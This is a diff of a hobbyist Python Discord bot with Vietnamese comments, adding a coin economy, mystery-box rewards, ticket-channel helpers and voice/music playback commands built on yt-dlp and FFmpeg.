@@ -11,21 +11,56 @@
 #                                                                                                                                                                                             #
 # ========================================Code===========================================
 
-import os
-import json
 import asyncio
-import random
 import datetime
 import itertools
+import json
+import os
+import random
 import re
+import subprocess
+import uuid
+from collections import deque
 from pathlib import Path
+from typing import Dict, List, Optional
+import aiohttp
 import discord
+import pytz
+import yt_dlp as youtube_dl
+from colorama import Fore, Style, init
 from discord import FFmpegPCMAudio, app_commands
 from discord.ext import commands, tasks
-import yt_dlp as youtube_dl
-import pytz
-from colorama import Fore, Style, init
+from dotenv import load_dotenv
+from help_pages import build_help_pages, HelpView
 init(autoreset=True)
+intents = discord.Intents.all()
+
+# Token For Bot
+
+BotToken = "Your Bot Token Here"
+
+# Config Path For ffmpeg
+FFMPEG_PATH = "/data/data/ru.iiec.pydroid3/files/ffmpeg/ffmpeg"
+
+try:
+    result = subprocess.run([FFMPEG_PATH, '-version'], capture_output=True, text=True)
+    if result.returncode == 0:
+        print(f"✅ FFmpeg found: {result.stdout.splitlines()[0]}")
+    else:
+        print("❌ FFmpeg not working")
+except Exception as e:
+    print(f"❌ FFmpeg error: {e}")
+
+# Create the structure for queueing songs - Dictionary of queues
+SONG_QUEUES = {}
+
+async def search_ytdlp_async(query, ydl_opts):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(None, lambda: _extract(query, ydl_opts))
+
+def _extract(query, ydl_opts):
+    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+        return ydl.extract_info(query, download=False)
 
 # Màu rainbow chroma
 colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
@@ -64,8 +99,12 @@ LEVEL_FILE = Path(os.path.join(DATA_DIR, "levels.json"))
 REACTION_FILE = Path(os.path.join(DATA_DIR, "reaction_roles.json"))
 SHOP_FILE = Path(os.path.join(DATA_DIR, "shop.json"))
 DAILY_FILE = Path(os.path.join(DATA_DIR, "daily_login.json"))
+BOX_FILE = Path(os.path.join(DATA_DIR, "box.json"))
 WORK_FILE = Path(os.path.join(DATA_DIR, "work.json"))
 TAIXIU_HISTORY_FILE = Path(os.path.join(DATA_DIR, "taixiu_history.json"))
+CONFIG_FILE = os.path.join(DATA_DIR, "ticket_config.json")
+TICKET_DATA = os.path.join(DATA_DIR, "ticket_data.json")
+TAG_FILE = os.path.join(DATA_DIR, "tag.json")
 
 # Biến toàn cục
 ALLOWED_USERS = {}
@@ -131,19 +170,34 @@ def load_banned_users():
         BANNED_USERS = {}
         
 def load_json(file_path):
+    """Đọc dữ liệu từ file JSON một cách an toàn"""
     try:
+        # Chuyển đổi path thành Path object nếu là string
+        if isinstance(file_path, str):
+            file_path = Path(file_path)
+        
         if file_path.exists():
             return json.loads(file_path.read_text(encoding='utf-8'))
         return {}
-    except (json.JSONDecodeError, Exception):
+    except (json.JSONDecodeError, Exception) as e:
+        print(f"[ERROR] Không thể đọc file {file_path}: {e}")
         return {}
 
-def save_json(data, file_path):
+def save_json(path, data):
+    """Lưu dữ liệu vào file JSON"""
     try:
-        file_path.write_text(json.dumps(data, indent=4, ensure_ascii=False), encoding='utf-8')
+        # Chuyển đổi path thành Path object nếu là string
+        if isinstance(path, str):
+            path = Path(path)
+        
+        # Đảm bảo thư mục tồn tại
+        path.parent.mkdir(parents=True, exist_ok=True)
+        
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
     except Exception as e:
-        print(f"Lỗi khi lưu file {file_path}: {e}")
-
+        print(f"[ERROR] Không thể lưu file {path}: {e}")
+        
 # Tạo file shop mẫu nếu chưa có
 if not SHOP_FILE.exists():
     default_shop = {
@@ -155,9 +209,10 @@ if not SHOP_FILE.exists():
         "mvpplusplus": {"price": 300000, "role_id": 1421143612543991900, "name": "MVP++ Role", "description": "Receive the MVP++ Rank on the Lonely Hub Script, Lonely Hub Forums, and Lonely Hub Discord."},
         "managerbot": {"price": 999999999999, "role_id": 1410600949646364702, "name": "Manager Role", "description": "Receive the Manager Rank on the Lonely Hub Script, Lonely Hub Forums, and Lonely Hub Discord."}
     }
-    save_json(default_shop, SHOP_FILE)
+    save_json(SHOP_FILE, default_shop)  # ĐÚNG: path trước, data sau
 
 credits = load_json(DATA_FILE)
+box = load_json(BOX_FILE)
 levels = load_json(LEVEL_FILE)
 reaction_roles = load_json(REACTION_FILE)
 shop_data = load_json(SHOP_FILE)
@@ -167,22 +222,35 @@ taixiu_history = load_json(TAIXIU_HISTORY_FILE)
 
 # ====== ECONOMY FUNCTIONS ======
 def get_balance(user_id):
-    return credits.get(str(user_id), 0)
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
+    return credits.get(user_id, 0)
 
 def add_balance(user_id, amount):
-    credits[str(user_id)] = get_balance(user_id) + amount
-    save_json(credits, DATA_FILE)
+    """Thêm coin cho user"""
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
+    credits[user_id] = get_balance(user_id) + amount
+    save_json(DATA_FILE, credits)
+    return credits[user_id]
 
 def remove_balance(user_id, amount):
+    """Trừ coin của user"""
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     if get_balance(user_id) >= amount:
-        credits[str(user_id)] -= amount
-        save_json(credits, DATA_FILE)
-        return True
-    return False
-    
+        credits[user_id] -= amount
+        save_json(DATA_FILE, credits)
+        return credits[user_id]
+    return None
+
+def set_balance(user_id, amount):
+    """Đặt số dư coin cho user"""
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
+    credits[user_id] = amount
+    save_json(DATA_FILE, credits)
+    return credits[user_id]
+
 def can_daily(user_id):
     """Kiểm tra user có thể nhận daily không"""
-    user_id = str(user_id)
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     if user_id not in daily_data:
         return True
     
@@ -192,7 +260,7 @@ def can_daily(user_id):
 
 def can_work(user_id):
     """Kiểm tra user có thể work không"""
-    user_id = str(user_id)
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     if user_id not in work_data:
         return True, 0
     
@@ -203,47 +271,35 @@ def can_work(user_id):
     if last_work_date != today:
         work_data[user_id]["count"] = 0
         work_data[user_id]["last_date"] = today.isoformat()
-        save_json(work_data, WORK_FILE)
+        save_json(WORK_FILE, work_data)
         return True, 0
     
     return work_data[user_id]["count"] < 5, work_data[user_id]["count"]
-
-def add_balance(user_id, amount):
-    user_id = str(user_id)
-    credits[user_id] = get_balance(user_id) + amount
-    save_json(credits, DATA_FILE)
-    return credits[user_id]  # 🔥 Trả về số dư mới
-    
-def remove_balance(user_id, amount):
-    user_id = str(user_id)
-    if get_balance(user_id) >= amount:
-        credits[user_id] -= amount
-        save_json(credits, DATA_FILE)
-        return credits[user_id]  # 🔥 Trả về số dư sau khi trừ
-    return None
     
 # ====== ECONOMY FUNCTIONS ======
-def get_balance(user_id):
-    return credits.get(str(user_id), 0)
 
-def add_balance(user_id, amount):
-    credits[str(user_id)] = get_balance(user_id) + amount
-    save_json(credits, DATA_FILE)
+def get_box(user_id: int) -> int:
+    return box.get(str(user_id), 0)
 
-def remove_balance(user_id, amount):
-    if get_balance(user_id) >= amount:
-        credits[str(user_id)] -= amount
-        save_json(credits, DATA_FILE)
-        return True
-    return False
+def add_box(user_id: int, amount: int):
+    uid = str(user_id)
+    box[uid] = get_box(uid) + amount
+    save_json(BOX_FILE, box)  # ĐÚNG: path trước, data sau
+    return box[uid]
 
-# THÊM HÀM NÀY - giải quyết lỗi set_balance
-def set_balance(user_id, amount):
-    """Đặt số dư coin cho user (ghi đè giá trị cũ)"""
-    user_id = str(user_id)
-    credits[user_id] = amount
-    save_json(credits, DATA_FILE)
-    return credits[user_id]  # Trả về số dư mới
+def remove_box(user_id: int, amount: int):
+    uid = str(user_id)
+    if get_box(uid) >= amount:
+        box[uid] -= amount
+        save_json(BOX_FILE, box)  # ĐÚNG: path trước, data sau
+        return box[uid]
+    return None
+
+def set_box(user_id: int, amount: int):
+    uid = str(user_id)
+    box[uid] = max(0, amount)
+    save_json(BOX_FILE, box)  # ĐÚNG: path trước, data sau
+    return box[uid]
     
 def simple_embed(title: str, description: str, color: discord.Color = discord.Color.blue()):
     """
@@ -258,18 +314,18 @@ def simple_embed(title: str, description: str, color: discord.Color = discord.Co
     
 def update_daily(user_id):
     """Cập nhật thời gian daily"""
-    user_id = str(user_id)
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     now = datetime.datetime.now()
     daily_data[user_id] = {
         "last_claimed": now.isoformat(),
         "date": now.strftime("%d/%m/%Y"),
         "time": now.strftime("%H:%M:%S")
     }
-    save_json(daily_data, DAILY_FILE)
+    save_json(DAILY_FILE, daily_data)
 
 def update_work(user_id):
     """Cập nhật số lần work"""
-    user_id = str(user_id)
+    user_id = str(user_id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     today = datetime.datetime.now().date()
     
     if user_id not in work_data:
@@ -284,8 +340,8 @@ def update_work(user_id):
     work_data[user_id]["last_work"] = datetime.datetime.now().isoformat()
     work_data[user_id]["date"] = datetime.datetime.now().strftime("%d/%m/%Y")
     work_data[user_id]["time"] = datetime.datetime.now().strftime("%H:%M:%S")
-    save_json(work_data, WORK_FILE)
-        
+    save_json(WORK_FILE, work_data)
+    
 # Cấu hình bot
 intents = discord.Intents.default()
 intents.message_content = True
@@ -303,6 +359,7 @@ UTC7 = pytz.timezone('Asia/Bangkok')  # Bangkok là UTC+7
 # GUILD ID bị cấm sử dụng spam và ghostping
 RESTRICTED_GUILD_ID = 1409783780217983029
 TARGET_GUILD_ID = 1409783780217983029
+LOG_CHANNEL_ID = 1409785969200070776
 
 def is_user_allowed(user_id):
     """Kiểm tra xem user có được phép sử dụng lệnh đặc biệt không"""
@@ -312,6 +369,19 @@ def is_user_banned(user_id):
     """Kiểm tra xem user có bị cấm sử dụng bot không"""
     return user_id in BANNED_USERS
 
+def load_ticket_json(file, default):
+    if os.path.exists(file):
+        with open(file, "r", encoding="utf-8") as f:
+            try:
+                return json.load(f)
+            except json.JSONDecodeError:
+                return default
+    return default
+
+def save_ticket_json(file, data):
+    with open(file, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=4, ensure_ascii=False)
+        
 def get_banned_users_table():
     """Hiển thị danh sách user bị ban (mobile-friendly)"""
     if not BANNED_USERS:
@@ -383,7 +453,7 @@ def add_taixiu_history(user_id, dice, total, result, win, amount):
         taixiu_history[user_id] = []
     taixiu_history[user_id].insert(0, record)
     taixiu_history[user_id] = taixiu_history[user_id][:5]
-    save_json(taixiu_history, TAIXIU_HISTORY_FILE)
+    save_json(TAIXIU_HISTORY_FILE, taixiu_history)  # ĐÃ SỬA THỨ TỰ THAM SỐ
     
 def get_utc7_time():
     """Lấy thời gian hiện tại theo UTC+7"""
@@ -445,16 +515,65 @@ async def check_roles():
                 except Exception as e:
                     print(f"Lỗi reset tên {member}: {e}")
                     
-def extract_name_and_emoji(item_name: str):
-    """
-    Tách emoji custom + tên role từ item['name']
-    VD: "<:vip:1421359862780264489> VIP Role"
-    """
-    match = re.match(r"<:(\w+):(\d+)> ?(.*)", item_name)
-    if match:
-        emoji_name, emoji_id, label = match.groups()
-        return discord.PartialEmoji(name=emoji_name, id=int(emoji_id)), label
-    return None, item_name
+def get_tag_emoji_for_dropdown(tag_name: str):
+    """Chỉ lấy emoji cho dropdown, không trả về tag_name"""
+    emoji_map = {
+        "LGBT": "♀️",
+        "PIG": "🐷", "PIG+": "🐷", "PIG++": "🐷",
+        "GOD": "👼",
+        "BETA TESTER": "🖥️",
+
+        # Custom emoji
+        "VIP": ("vip", 1421359862780264489),
+        "VIP+": ("vipplus", 1421359801975312436),
+        "VIP++": ("vipplusplus", 1421359758711062619),
+        "MVP": ("mvp", 1421359907030171699),
+        "MVP+": ("mvpplus", 1421359951028162560),
+        "MVP++": ("mvpplusplus", 1421359974092902481),
+        "Manager": ("manager", 1421365250690777139)
+    }
+
+    val = emoji_map.get(tag_name)
+    if not val:
+        return None
+
+    # Nếu là tuple (custom emoji)
+    if isinstance(val, tuple):
+        name, emoji_id = val
+        return discord.PartialEmoji(name=name, id=emoji_id)
+
+    # Unicode emoji (string)
+    return val
+
+# Giữ nguyên hàm cũ cho các chỗ khác
+def extract_name_and_emoji_from_tag(tag_name: str):
+    emoji_map = {
+        "LGBT": "♀️",
+        "PIG": "🐷", "PIG+": "🐷", "PIG++": "🐷",
+        "GOD": "👼",
+        "BETA TESTER": "🖥️",
+
+        # Custom emoji
+        "VIP": ("vip", 1421359862780264489),
+        "VIP+": ("vipplus", 1421359801975312436),
+        "VIP++": ("vipplusplus", 1421359758711062619),
+        "MVP": ("mvp", 1421359907030171699),
+        "MVP+": ("mvpplus", 1421359951028162560),
+        "MVP++": ("mvpplusplus", 1421359974092902481),
+        "Manager": ("manager", 1421365250690777139)
+    }
+
+    val = emoji_map.get(tag_name)
+    if not val:
+        return None, tag_name
+
+    # Nếu là tuple (custom emoji)
+    if isinstance(val, tuple):
+        name, emoji_id = val
+        return discord.PartialEmoji(name=name, id=emoji_id), tag_name
+
+    # Unicode emoji (string)
+    return val, tag_name
     
 # Thêm vào đầu file (sau setup_logging / get_utc7_time)
 def log(message: str):
@@ -471,6 +590,91 @@ def log(message: str):
         # Không ném lỗi từ hàm log để tránh phá flow chính
         print(f"[LOG ERROR] {e}")
 
+# -------------------
+# Utility parsing roles
+# -------------------
+def parse_role_string(role_str: str) -> List[int]:
+    """
+    Accept input like: '<@&111> <@&222>'  or '111 222' or '111,222'
+    Return list of ints (role IDs)
+    """
+    if not role_str:
+        return []
+    role_str = role_str.replace(",", " ")
+    parts = role_str.split()
+    ids = []
+    for p in parts:
+        if p.startswith("<@&") and p.endswith(">"):
+            try:
+                ids.append(int(p[3:-1]))
+            except:
+                continue
+        else:
+            try:
+                ids.append(int(p))
+            except:
+                continue
+    return ids
+    
+# -------------------
+# CloseTicketView (xoá kênh sau 10s)
+# -------------------
+class CloseTicketView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(label="🔒 Đóng Ticket", style=discord.ButtonStyle.red)
+    async def close(self, interaction: discord.Interaction, button: discord.ui.Button):
+        channel = interaction.channel
+        guild = interaction.guild
+
+        overwrites = {
+            guild.default_role: discord.PermissionOverwrite(view_channel=False),
+            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True),
+        }
+        try:
+            await channel.edit(overwrites=overwrites, name=f"closed-{channel.name}")
+        except Exception:
+            pass
+
+        embed = discord.Embed(
+            title="🔒 Ticket đã được đóng",
+            description=f"Channel sẽ bị xóa sau 10 giây.",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+        if LOG_CHANNEL_ID:
+            log_channel = guild.get_channel(LOG_CHANNEL_ID)
+            if log_channel:
+                lc_embed = discord.Embed(
+                    title="🔒 Ticket Đóng",
+                    description=f"Ticket {channel.mention} đã được đóng bởi {interaction.user.mention}. Xoá sau 10s.",
+                    color=discord.Color.red()
+                )
+                await log_channel.send(embed=lc_embed)
+
+        await asyncio.sleep(10)
+        try:
+            await channel.delete(reason=f"Ticket closed by {interaction.user}")
+        except Exception as e:
+            print(f"Lỗi xoá kênh ticket: {e}")
+            
+def add_ticket(channel_id, user_id):
+    data = load_ticket_json(TICKET_DATA, {})
+    data[str(channel_id)] = {
+        "user_id": user_id,
+        "created_at": datetime.datetime.utcnow().isoformat(),
+        "active": False
+    }
+    save_ticket_json(TICKET_DATA, data)
+
+def set_active(channel_id):
+    data = load_ticket_json(TICKET_DATA, {})
+    if str(channel_id) in data:
+        data[str(channel_id)]["active"] = True
+        save_ticket_json(TICKET_DATA, data)
+        
 def log_command(user, command_name, guild_name, command_type="Text Command"):
     """Ghi log vào file và console"""
     # Lấy thời gian hiện tại theo UTC+7
@@ -577,34 +781,1379 @@ async def on_ready():
     
 # ==================== CÁC LỆNH MỚI: BAN/UNBAN/WHITELIST ====================
 
+# /box
+@bot.tree.command(name="box", description="Xem số Mystery Box bạn đang có")
+async def box_cmd(interaction: discord.Interaction):
+    amount = get_box(interaction.user.id)
+    embed = discord.Embed(
+        title="📦 Kho Mystery Box",
+        description=f"Bạn hiện có **{amount}** <:enderchest:1422102654766678116>",
+        color=discord.Color.blurple()
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/box", guild_name, "Slash Command")
+    await send_dm_notification(user, "/box", guild_name, "Slash Command")
+
+# /boxopen
+@bot.tree.command(name="boxopen", description="Mở Mystery Box")
+async def boxopen(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
+
+    if get_box(user_id) <= 0:
+        return await interaction.response.send_message(
+            embed=discord.Embed(
+                title="❌ Không có box",
+                description="Bạn không có Mystery Box nào để mở!",
+                color=discord.Color.red()
+            ),
+            ephemeral=True
+        )
+
+    # trừ box
+    remove_box(user_id, 1)
+
+    opening_embed = discord.Embed(
+        description="<a:EnderChestNew:1422144204129304607>\n**Đang mở mystery box...**",
+        color=discord.Color.orange()
+    )
+
+    # gửi tin nhắn trực tiếp trong channel
+    channel = interaction.channel
+    msg = await channel.send(embed=opening_embed)
+
+    await asyncio.sleep(5)
+
+    rewards = [
+        ("200 Coins", 55),
+        ("LGBT", 50),
+        ("PIG", 20),
+        ("PIG+", 15),
+        ("PIG++", 10),
+        ("GOD", 5),
+        ("BETA TESTER", 1),
+        (None, 100)  # không trúng gì
+    ]
+    choice = random.choices(
+        [r for r, _ in rewards],
+        weights=[w for _, w in rewards],
+        k=1
+    )[0]
+
+    if choice is None:
+        result_embed = discord.Embed(
+            title="😢 Rất tiếc!",
+            description="Bạn không nhận được gì từ Mystery Box.",
+            color=discord.Color.red()
+        )
+
+    elif choice == "200 Coins":
+        add_balance(user_id, 200)
+        result_embed = discord.Embed(
+            title="🎉 Chúc mừng!",
+            description=f"Bạn nhận được **200 <:lonelycoin:1421380256148750429>**",
+            color=discord.Color.green()
+        )
+
+    else:
+        # add role nếu có trong tag.json
+        tags = load_json(TAG_FILE)
+        role_id = tags.get(choice)
+        if role_id:
+            member = interaction.guild.get_member(interaction.user.id)
+            if member:
+                role = interaction.guild.get_role(role_id)
+                if role:
+                    if role in member.roles:
+                        result_embed = discord.Embed(
+                            title="⚠️ Thông báo",
+                            description=f"Bạn đã có rank **{choice}** rồi!",
+                            color=discord.Color.orange()
+                        )
+                    else:
+                        await member.add_roles(role)
+                        result_embed = discord.Embed(
+                            title="🎉 Chúc mừng!",
+                            description=f"Bạn nhận được rank **{choice}**!",
+                            color=discord.Color.green()
+                        )
+
+    # edit tin nhắn ban đầu thành kết quả
+    await msg.edit(embed=result_embed)
+
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/boxopen", guild_name, "Slash Command")
+    
+    await send_dm_notification(user, "/boxopen", guild_name, "Slash Command")
+    
+# ==================== ADMIN BOX COMMANDS ====================
+# ==================== ADMIN BOX COMMANDS ====================
+@bot.tree.command(name="join", description="Tham gia vào voice channel")
+async def join(interaction: discord.Interaction):
+    print(f"\n[JOIN] Command được gọi bởi {interaction.user.name}")
+    
+    try:
+        # Kiểm tra xem user có trong voice channel không
+        if not interaction.user.voice or not interaction.user.voice.channel:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description="Bạn cần phải ở trong một voice channel!",
+                color=discord.Color.red()
+            )
+            print("[JOIN] User không ở trong voice channel")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        voice_channel = interaction.user.voice.channel
+        print(f"[JOIN] User ở trong channel: {voice_channel.name}")
+        
+        # Kiểm tra quyền kết nối
+        permissions = voice_channel.permissions_for(interaction.guild.me)
+        if not permissions.connect:
+            embed = discord.Embed(
+                title="❌ Lỗi quyền",
+                description="Tôi không có quyền kết nối đến voice channel này!",
+                color=discord.Color.red()
+            )
+            print("[JOIN] Bot không có quyền connect")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        # Kiểm tra xem bot đã ở trong voice channel chưa
+        voice_client = interaction.guild.voice_client
+        
+        if voice_client and voice_client.is_connected():
+            print(f"[JOIN] Bot đang ở channel: {voice_client.channel.name}")
+            if voice_client.channel.id == voice_channel.id:
+                embed = discord.Embed(
+                    title="⚠️ Thông báo",
+                    description=f"Tôi đã ở trong voice channel **{voice_channel.name}** rồi!",
+                    color=discord.Color.orange()
+                )
+                await interaction.response.send_message(embed=embed)
+                print("[JOIN] Bot đã ở trong channel này")
+                return
+            else:
+                # Di chuyển sang channel khác
+                print(f"[JOIN] Di chuyển từ {voice_client.channel.name} đến {voice_channel.name}")
+                await voice_client.move_to(voice_channel)
+                print("[JOIN] Đã di chuyển thành công")
+        else:
+            # Defer vì kết nối voice có thể mất thời gian
+            await interaction.response.defer()
+            print("[JOIN] Đã defer, đang kết nối...")
+            
+            # Kết nối đến voice channel
+            voice_client = await voice_channel.connect(timeout=10.0, reconnect=True)
+            print(f"[JOIN] Kết nối thành công: {voice_client.is_connected()}")
+            
+            # Đợi để đảm bảo kết nối ổn định
+            await asyncio.sleep(0.3)
+
+        # Tạo embed thông báo
+        embed = discord.Embed(
+            title="✅ Đã tham gia voice channel",
+            description=f"Đã kết nối đến **{voice_channel.name}**",
+            color=discord.Color.green(),
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Channel", value=voice_channel.mention, inline=True)
+        embed.add_field(name="Thành viên", value=len(voice_channel.members), inline=True)
+        
+        if interaction.user.display_avatar:
+            embed.set_footer(
+                text=f"Yêu cầu bởi {interaction.user.display_name}", 
+                icon_url=interaction.user.display_avatar.url
+            )
+        else:
+            embed.set_footer(text=f"Yêu cầu bởi {interaction.user.display_name}")
+        
+        # Gửi tin nhắn - kiểm tra đã defer chưa
+        print("[JOIN] Đang gửi thông báo...")
+        if interaction.response.is_done():
+            await interaction.followup.send(embed=embed)
+        else:
+            await interaction.response.send_message(embed=embed)
+        print("[JOIN] Đã gửi thông báo thành công!")
+        
+    except asyncio.TimeoutError:
+        print("[JOIN] Lỗi timeout khi kết nối")
+        embed = discord.Embed(
+            title="❌ Lỗi kết nối",
+            description="Không thể kết nối đến voice channel (timeout)!",
+            color=discord.Color.red()
+        )
+        if interaction.response.is_done():
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        else:
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+    except Exception as e:
+        print(f"[JOIN] Lỗi: {type(e).__name__}: {e}")
+        import traceback
+        traceback.print_exc()
+        
+        embed = discord.Embed(
+            title="❌ Lỗi hệ thống",
+            description=f"Có lỗi xảy ra khi tham gia voice channel!",
+            color=discord.Color.red()
+        )
+        try:
+            if interaction.response.is_done():
+                await interaction.followup.send(embed=embed, ephemeral=True)
+            else:
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+        except:
+            print("[JOIN] Không thể gửi thông báo lỗi")
+
+@bot.tree.command(name="leave", description="Rời khỏi voice channel")
+async def leave(interaction: discord.Interaction):
+    print(f"\n[LEAVE] Command được gọi bởi {interaction.user.name}")
+    
+    try:
+        # Kiểm tra xem bot có trong voice channel không
+        voice_client = interaction.guild.voice_client
+        
+        if not voice_client or not voice_client.is_connected():
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description="Tôi không ở trong voice channel nào!",
+                color=discord.Color.red()
+            )
+            print("[LEAVE] Bot không ở trong voice channel")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        # Lưu thông tin channel TRƯỚC khi disconnect
+        voice_channel = voice_client.channel
+        voice_channel_name = voice_channel.name
+        voice_channel_mention = voice_channel.mention
+        print(f"[LEAVE] Bot đang ở channel: {voice_channel_name}")
+        
+        # Defer vì disconnect có thể mất thời gian
+        await interaction.response.defer()
+        print("[LEAVE] Đã defer, đang disconnect...")
+        
+        # Xóa queue của guild này
+        guild_id = str(interaction.guild_id)
+        if guild_id in SONG_QUEUES:
+            SONG_QUEUES[guild_id].clear()
+            print(f"[LEAVE] Đã xóa queue của guild {guild_id}")
+        
+        # Rời khỏi voice channel
+        await voice_client.disconnect(force=True)
+        print("[LEAVE] Đã disconnect")
+        
+        # Đợi để đảm bảo disconnect hoàn tất
+        await asyncio.sleep(0.3)
+
+        # Tạo embed thông báo
+        embed = discord.Embed(
+            title="👋 Đã rời voice channel",
+            description=f"Đã rời khỏi **{voice_channel_name}**",
+            color=discord.Color.blue(),
+            timestamp=discord.utils.utcnow()
+        )
+        embed.add_field(name="Channel", value=voice_channel_mention, inline=True)
+        
+        if interaction.user.display_avatar:
+            embed.set_footer(
+                text=f"Yêu cầu bởi {interaction.user.display_name}", 
+                icon_url=interaction.user.display_avatar.url
+            )
+        else:
+            embed.set_footer(text=f"Yêu cầu bởi {interaction.user.display_name}")
+        
+        print("[LEAVE] Đang gửi thông báo...")
+        await interaction.followup.send(embed=embed)
+        print("[LEAVE] Đã gửi thông báo thành công!")
+        
+    except Exception as e:
+        print(f"[LEAVE] Lỗi: {type(e).__name__}: {e}")
+        import traceback
+        traceback.print_exc()
+        
+        # Thử cleanup voice client
+        try:
+            if interaction.guild.voice_client:
+                await interaction.guild.voice_client.disconnect(force=True)
+                print("[LEAVE] Đã cleanup voice client")
+        except:
+            pass
+        
+        embed = discord.Embed(
+            title="❌ Lỗi hệ thống",
+            description=f"Có lỗi xảy ra khi rời voice channel!",
+            color=discord.Color.red()
+        )
+        try:
+            if interaction.response.is_done():
+                await interaction.followup.send(embed=embed, ephemeral=True)
+            else:
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+        except:
+            print("[LEAVE] Không thể gửi thông báo lỗi")
+
+@bot.tree.command(name="skip", description="Skips the current playing song")
+async def skip(interaction: discord.Interaction):
+    voice_client = interaction.guild.voice_client
+    if voice_client and (voice_client.is_playing() or voice_client.is_paused()):
+        voice_client.stop()
+        await interaction.response.send_message("⏭️ Đã skip bài hát!")
+    else:
+        await interaction.response.send_message("❌ Không có bài hát nào đang phát!")
+
+
+@bot.tree.command(name="pause", description="Pause the currently playing song.")
+async def pause(interaction: discord.Interaction):
+    voice_client = interaction.guild.voice_client
+
+    if voice_client is None:
+        return await interaction.response.send_message("❌ Tôi không ở trong voice channel!")
+
+    if not voice_client.is_playing():
+        return await interaction.response.send_message("❌ Không có bài hát nào đang phát!")
+    
+    voice_client.pause()
+    await interaction.response.send_message("⏸️ Đã tạm dừng!")
+
+
+@bot.tree.command(name="resume", description="Resume the currently paused song.")
+async def resume(interaction: discord.Interaction):
+    voice_client = interaction.guild.voice_client
+
+    if voice_client is None:
+        return await interaction.response.send_message("❌ Tôi không ở trong voice channel!")
+
+    if not voice_client.is_paused():
+        return await interaction.response.send_message("❌ Bài hát không bị tạm dừng!")
+    
+    voice_client.resume()
+    await interaction.response.send_message("▶️ Đã tiếp tục phát!")
+
+
+@bot.tree.command(name="stop", description="Stop playback and clear the queue.")
+async def stop(interaction: discord.Interaction):
+    voice_client = interaction.guild.voice_client
+
+    if not voice_client or not voice_client.is_connected():
+        return await interaction.response.send_message("❌ Tôi không kết nối đến voice channel!")
+
+    guild_id_str = str(interaction.guild_id)
+    if guild_id_str in SONG_QUEUES:
+        SONG_QUEUES[guild_id_str].clear()
+
+    if voice_client.is_playing() or voice_client.is_paused():
+        voice_client.stop()
+
+    await voice_client.disconnect()
+    await interaction.response.send_message("🛑 Đã dừng phát và ngắt kết nối!")
+
+
+@bot.tree.command(name="play", description="Play a song or add it to the queue.")
+@app_commands.describe(song_query="Tên bài hát hoặc URL YouTube")
+async def play(interaction: discord.Interaction, song_query: str):
+    await interaction.response.defer()
+    print(f"\n[PLAY] Command được gọi bởi {interaction.user.name}")
+    print(f"[PLAY] Tìm kiếm: {song_query}")
+
+    # Kiểm tra user có trong voice channel không
+    if not interaction.user.voice or not interaction.user.voice.channel:
+        await interaction.followup.send("❌ Bạn cần phải ở trong voice channel!")
+        return
+
+    voice_channel = interaction.user.voice.channel
+    voice_client = interaction.guild.voice_client
+
+    # CHỈ KIỂM TRA KẾT NỐI, KHÔNG TỰ ĐỘNG KẾT NỐI
+    if voice_client is None:
+        await interaction.followup.send("❌ Bot chưa tham gia voice channel! Hãy dùng lệnh `/join` trước.")
+        return
+    
+    # Kiểm tra xem bot có ở cùng voice channel với user không
+    if voice_client.channel != voice_channel:
+        await interaction.followup.send("❌ Bot không ở trong voice channel của bạn! Hãy dùng lệnh `/join` hoặc mời bot vào channel của bạn.")
+        return
+
+    # Kiểm tra kết nối
+    if not voice_client.is_connected():
+        await interaction.followup.send("❌ Bot đã mất kết nối voice! Hãy dùng lệnh `/join` lại.")
+        return
+
+    # Gửi thông báo đang tìm kiếm
+    search_msg = await interaction.followup.send("🔍 **Đang tìm kiếm...**")
+
+    # Tìm kiếm YouTube với cấu hình TỐI ƯU TỐC ĐỘ
+    try:
+        # CẤU HÌNH TỐI ƯU CHO TỐC ĐỘ - GIẢM CHẤT LƯỢNG ĐỂ TẢI NHANH
+        ydl_options = {
+            "format": "bestaudio[abr<=64]/bestaudio",  # GIẢM XUỐNG 64kbps để tải nhanh
+            "noplaylist": True,
+            "quiet": True,
+            "no_warnings": True,
+            "extractaudio": True,  # Chỉ lấy audio
+            "audioformat": "mp3",
+            "nocheckcertificate": True,
+            "ignoreerrors": True,
+            "logtostderr": False,
+            "no_call_home": True,
+            "nooverwrites": True,
+            "nopart": True,
